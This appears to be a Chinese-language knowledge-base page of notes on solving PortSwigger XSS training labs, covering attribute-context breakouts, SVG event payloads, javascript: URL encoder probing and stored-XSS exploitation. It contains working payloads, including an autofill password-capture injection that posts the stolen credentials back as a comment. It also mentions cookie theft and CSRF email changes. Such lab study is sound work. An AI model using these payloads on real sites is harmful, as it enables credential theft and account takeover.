---
title: xss-context-family
---
# xss-context-family

PortSwigger XSS context 题的通用判定/利用模式。核心是**先探照射点与编码器**,
再选绕过;ramp 见各记录。工具:`lab_alert`(CDP 预挂 alert/confirm/prompt 勾子)、
`raw_http`(字节级请求行,探编码器/绕 WAF 必需)、`browse eval`、`html_text`。

## 可复用模式

1. **HTML 属性里的 JS 串 + 服务端只转义 `'`**:服务端把 `'`→`\'`、`\`→`\\`,
   `<`/`"` 走别的编码;但射点在**双引号 HTML 属性**内、JS 串是单引号。
   绕法:提交 **HTML 实体** `&apos;`(或 `&#39;`)——服务端看不到 `'` 故不转义,
   浏览器解析属性时先 HTML 解码成 `'`,JS 才看到它 → 破串。前提:服务端**不**
   HTML 编码 `&`(实证:存留原文)。
   实战(lab-onclick…backslash-escaped,stored 注释 website 字段):
   `http://x/?a=&apos;-alert(1)-&apos;` → `onclick="…track('http://x/?a='-alert(1)-'')"`
   → 点作者名即弹。判读用 `lab_alert --driver`(见下)。

2. **SVG 标签/事件漏网**:常见 HTML 标签被挡(且部分实现直接 400)时,`<svg>`
   子集常放行。`<svg><animatetransform onbegin=alert(1)>` 载入即触发
   (lab-some-svg-markup-allowed 实证)。探标签:逐个 `?search=<tag>` 看 200/400
   与反射是否被编码。

3. **`javascript:` URL 射点**:输入落进 `href="javascript:…body:'<URI>'"`。
   现代 Chrome **不对 `javascript:` URL 做百分号解码**(实测 `javascript:alert%281%29`
   不执行,静态属性与 JS 赋值皆然)——别指望用 `%27` 当 `'`。
   实测编码器(该 lab 实例):百分号编码 `' ; : = @ < > & %`,**丢弃**
   `( ) [ ] \`` 与 `\`,**保留** `" { } | $ ^ + * , / ! ~` 与空白。故:
   JS 串(单引号)不可破;HTML 属性(双引号)可被 `"` 破,但 `=`/`<`/`>` 被编码,
   无法加事件处理器/新标签 → 该实例机制未收口(见 lab3 记录)。

4. **存储型偷密码(无 exploit server 时的同源回传)**:评论注入
   `<input name=username id=username><input type=password name=password onchange="if(this.value.length)fetch('/post/comment',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'csrf='+document.getElementsByName('csrf')[0].value+'&postId=1&comment='+encodeURIComponent(username.value+' : '+this.value)+'&name=pw&email=pw@x.com'})">`
   —— victim 的密码管理器填充 → `change` → 用 victim 自己的 csrf **把凭据发成一条评论**,
   自己再读回。前提:该 lab 没有 exploit server 且平台防火墙挡外联(Collaborator 之外的 OOB 不可用)。
   先确认实例头部有没有 exploit-link,再决定"外部回传"还是"同源回传"。

## 存储型 XSS 的利用面

- **执行面**:评论若是**服务端渲染**into HTML,`<script>` 会直接执行;若走 XHR+`innerHTML` 则不会。
  先看 `?postId=` 响应里有没有未编码的 `<script>`。
- **解析顺序坑(踩过)**:评论在页面上常排在留言表单**之前**,脚本在解析期执行时
  `document.getElementsByName('csrf')[0]` 还不存在 → 静默失败。要读页面里的 csrf/元素时,
  必须 `window.addEventListener('load',…)` 再跑;只做 `fetch('/my-account')`+正则取 token 的写法不受影响。
- **无需 exploit server 的两类外传**:①同源回传——把要偷的串(凭据/cookie)POST 成一条评论,自己再读回
  ([[lab-capturing-passwords]]、[[lab-stealing-cookies]]);②直接就着 victim 会话干脏活
  (偷 csrf 改邮箱:[[lab-perform-csrf]])。
- **victim 面**:博客评论类 lab 的 victim 会自动浏览评论(交付只需发评论);只改自己邮箱/自己是偷不到 victim 的。

## 判读纪律

- **`lab_alert --driver` 直接调 `el.onclick()`(或 `el.click()` 前先关掉 href 跳转)**:
  若用 `el.click()` 触发带 `href` 的链接,跳转会销毁文档,预挂的 `window.__labAlerts`
  随之丢失,`fired=false` 是假阴性(本批踩过)。用 `--driver "...onclick()"` 或把
  href 指向无害地址再 `click()`。
- 反射编码器探测:用 `raw_http --request-line 'GET /p?x=<chars> HTTP/1.1'`,
  再 `text_grep`/`read` 看原文。`raw_http --out` 已修为写**完整**首响应体
  (原实现依赖被 `--quiet` 抑制的 400 字截断字段)。
- 隧道:XSS 反射题常需先判"哪些字符 400/被删/被编码",再决定绕过形态。

## 实录溯源

- [[lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped]]、[[lab-some-svg-markup-allowed]]、[[lab-javascript-url-some-characters-blocked]]、[[lab-angularjs-expression]]、[[lab-very-strict-csp-with-dangling-markup-attack]]
- [[lab-capturing-passwords]](存储型偷密码:同源评论回传)
- [[lab-perform-csrf]](偷 victim csrf 改邮箱)、[[lab-stealing-cookies]](偷 victim cookie 并冒充)
- Angular/CSTI 表达式面与 1.4.4 沙箱另见 [[client-side-template-injection-family]]

## 相关族

- DOM 型源→汇见 [[dom-xss-family]];CSP 表单面见 [[csrf-family]]。
- 方法论:web-vuln-methods(seed 层,按名引用)。
